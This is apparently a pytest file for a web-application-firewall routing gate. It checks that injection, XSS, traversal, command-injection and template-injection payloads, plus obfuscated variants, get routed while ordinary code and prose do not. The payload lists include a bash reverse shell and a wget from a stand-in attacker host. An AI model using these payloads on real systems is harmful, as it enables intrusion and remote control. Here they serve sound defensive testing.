"""AUDIT - ml/waf/gate.py: which lines of a non-request-shaped body deserve a WAF look.

Positives must be routed (otherwise the WAF never sees a code/prose-shaped payload); benign code/prose must
not be (latency + false positives). The false-trigger test uses REAL text from the machine, not hand-written
strings, because the whole point of the gate is to leave ordinary source and docs alone.
"""
import os
import random
import time

import pytest

from ml.waf.gate import MAX_PARTS, waf_gate_parts

POSITIVES = {
    "sqli union": "1 UNION SELECT username, password FROM users--",
    "sqli union all": "x' UNION ALL SELECT NULL,NULL,version()--",
    "sqli tautology quote": "admin' OR '1'='1",
    "sqli tautology number": "1 OR 1=1",
    "sqli time": "1; SELECT pg_sleep(5)",
    "sqli sleep": "id=1 AND SLEEP(5)",
    "sqli stacked drop": "1; DROP TABLE users",
    "sqli comment tail": "admin'--",
    "sqli info schema": "' UNION SELECT table_name FROM information_schema.tables--",
    "sqli load_file": "1 UNION SELECT load_file('/etc/passwd')",
    "xss script": "<script>alert(document.cookie)</script>",
    "xss img onerror": '<img src=x onerror=alert(1)>',
    "xss svg onload": "<svg onload=alert(1)>",
    "xss js uri": "javascript:alert(1)",
    "xss external script": '<script src="//evil.example/x.js"></script>',
    "traversal dots": "../../../../etc/passwd",
    "traversal windows": "..\\..\\..\\windows\\win.ini",
    "traversal encoded": "..%2f..%2f..%2fetc%2fpasswd",
    "lfi wrapper": "php://filter/convert.base64-encode/resource=index.php",
    "cmdi semicolon": "; cat /etc/passwd",
    "cmdi pipe": "| nc 10.0.0.1 4444",
    "cmdi subshell": "$(whoami)",
    "cmdi backtick": "`id`",
    "cmdi reverse shell": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "cmdi ifs": "cat${IFS}/etc/passwd",
    "cmdi and": "127.0.0.1 && wget http://evil.example/x.sh",
    "ssti jinja": "{{config.__class__.__init__.__globals__}}",
    "ssti arithmetic": "{{7*7}}",
    "ssti el": "${7*7}",
    "ssti freemarker": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
}


@pytest.mark.parametrize("name", sorted(POSITIVES))
def test_canonical_payload_is_routed_to_the_waf(name):
    assert waf_gate_parts(POSITIVES[name]), f"gate ignored {name!r}: {POSITIVES[name]!r}"


@pytest.mark.parametrize("name,text", [
    ("sqli in prose", "Hi support, my login fails with the name admin' OR '1'='1 on the form, any idea?"),
    ("sqli in a code block", "```sql\nSELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admins--\n```"),
    ("xss in markdown", "Look at this: <script>alert(1)</script> it shows a popup"),
    ("cmdi in a log line", "2026-11-05 10:00:01 GET /ping?host=8.8.8.8;cat /etc/passwd 200"),
    ("payload on line 40", "\n".join(["ordinary line %d" % i for i in range(39)]) + "\n1 UNION SELECT a,b FROM c--"),
])
def test_payloads_embedded_in_larger_text_are_found(name, text):
    assert waf_gate_parts(text), name


@pytest.mark.parametrize("name,text", [
    ("url encoded sqli", "%27%20OR%20%271%27%3D%271"),
    ("double encoded traversal", "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
    ("plus as space", "1+UNION+SELECT+username,password+FROM+users--"),
    ("mixed case", "1 UnIoN SeLeCt username FROM users--"),
    ("tab as space", "1\tUNION\tSELECT\tusername FROM users--"),
    ("newline as space", "1 UNION\nSELECT username FROM users--"),
    ("comment as space", "1 UNION/**/SELECT/**/username FROM users--"),
    ("split by inline comments", "1 UN/**/ION SEL/**/ECT username FROM users--"),
    ("mysql version comment", "1 /*!50000UNION*/ /*!50000SELECT*/ username FROM users--"),
    ("html entity xss", "&lt;script&gt;alert(1)&lt;/script&gt;"),
    ("unicode fullwidth xss", "＜script＞alert(1)＜/script＞"),
    ("mixed case js uri", "jaVasCript:alert(1)"),
    ("tab inside js uri", "java\tscript:alert(1)"),
    ("null byte in tag", "<scr\x00ipt>alert(1)</scr\x00ipt>"),
    ("ifs with braces", "cat${IFS}/etc/passwd"),
    ("quote split command", "c''at /etc/passwd"),
    ("backslash split command", "c\\at /etc/passwd"),
    ("base64 pipe shell", "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh"),
    ("double dot slash nesting", "....//....//....//etc/passwd"),
    ("utf8 overlong slash", "..%c0%af..%c0%af..%c0%afetc/passwd"),
])
def test_obfuscated_variants_are_still_routed(name, text):
    assert waf_gate_parts(text), f"gate missed evasion {name!r}"


BENIGN_SNIPPETS = {
    "python code": "def add(a, b):\n    return a + b\n\nfor i in range(10):\n    print(i)\n",
    "js code": "const total = items.reduce((s, i) => s + i.price, 0);\nconsole.log(`Total: ${total}`);\n",
    "sql documentation": "To select rows from a table use SELECT name FROM customers WHERE country = 'DE' ORDER BY name.",
    "english about sql": "A UNION combines rows from two queries; the other keyword is INTERSECT.",
    "html snippet": '<div class="card"><h1>Title</h1><p>Hello <b>world</b></p><a href="/more">more</a></div>',
    "html form": '<form action="/login" method="post"><input name="user"><input type="password" name="pw"></form>',
    "shell loop": "for f in *.log; do\n  gzip \"$f\"\ndone\n",
    "shell pipeline": "ps aux | grep nginx | wc -l",
    "log line": '127.0.0.1 - - [05/Nov/2026:10:00:01 +0000] "GET /index.html HTTP/1.1" 200 1043',
    "json config": '{"name": "demo", "version": "1.2.3", "scripts": {"build": "tsc", "test": "jest"}}',
    "yaml config": "server:\n  port: 8080\n  workers: 4\nlogging:\n  level: info\n",
    "markdown": "# Title\n\nSome *emphasis* and a [link](https://example.com/a?b=c&d=e).\n",
    "email": "Hi Sam,\n\nCan we move the meeting to 3pm? Thanks, Alex",
    "sentence with and/or": "You can pay by card and or by transfer; either works.",
    "price text": "The plan costs $5.00 (or $50 per year) and includes support.",
    "regex doc": "Use the pattern ^[a-z]+$ to match lowercase words.",
    "template doc": "In Jinja you write {{ name }} to print a variable.",
    "path text": "The config lives in /etc/myapp/config.yaml and logs go to /var/log/myapp.log",
}


@pytest.mark.parametrize("name", sorted(BENIGN_SNIPPETS))
def test_ordinary_code_and_prose_is_not_routed(name):
    assert waf_gate_parts(BENIGN_SNIPPETS[name]) == [], f"gate fired on benign {name!r}"


def test_gate_trigger_rate_on_real_system_text_is_low():
    """A priori budget: at most 5% of ordinary shell/config/HTML/markdown files may trigger the WAF route."""
    import random as _r
    from dataset_tools.waf.v2 import benign_real
    rows = benign_real.load_system_text(("/usr/share",), _r.Random(11), per_kind=150)
    if len(rows) < 100:
        pytest.skip("not enough local system text")
    fired = [r for r in rows if waf_gate_parts(r["text"])]
    rate = len(fired) / len(rows)
    by_kind = {}
    for r in fired:
        by_kind[r["source"]] = by_kind.get(r["source"], 0) + 1
    assert rate <= 0.05, f"gate fired on {len(fired)}/{len(rows)} ({rate:.1%}) real benign snippets: {by_kind}"


def test_part_cap_and_line_cap_hold():
    many = "\n".join("1 UNION SELECT a,b FROM c%d--" % i for i in range(50))
    assert 0 < len(waf_gate_parts(many)) <= MAX_PARTS
    assert all(len(p) <= 2000 for p in waf_gate_parts("x" * 5000 + " 1 UNION SELECT a FROM b-- " + "y" * 5000))


def test_payload_far_beyond_the_scan_window_is_still_found():
    """100k-character scan window: an attacker can pad past it if the body is accepted that large."""
    assert waf_gate_parts("a" * 150_000 + "\n1 UNION SELECT username FROM users--")


@pytest.mark.parametrize("body", ["", None, " ", "\n\n", "\x00" * 10])
def test_degenerate_input_does_not_crash(body):
    assert waf_gate_parts(body) == []


def test_pathological_inputs_do_not_trigger_catastrophic_backtracking():
    cases = ["select " * 20_000, "a" * 100_000, "{{" * 30_000, "<" * 50_000, "' " * 50_000, "$(" * 30_000,
             "union " * 20_000, "'" + " or" * 30_000, "<script" + " a=1" * 20_000]
    for c in cases:
        t0 = time.perf_counter()
        waf_gate_parts(c)
        assert time.perf_counter() - t0 < 2.0, c[:20]
